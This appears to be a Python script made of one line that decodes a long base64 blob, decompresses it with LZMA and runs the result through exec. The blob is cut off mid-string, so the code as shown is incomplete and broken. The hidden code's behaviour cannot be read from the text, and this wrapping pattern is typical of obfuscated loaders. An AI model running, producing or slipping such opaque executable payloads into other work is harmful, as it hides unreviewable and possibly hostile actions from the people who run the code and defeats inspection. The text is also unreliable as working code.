import base64, lzma; exec(compile(lzma.decompress(base64.b64decode(b'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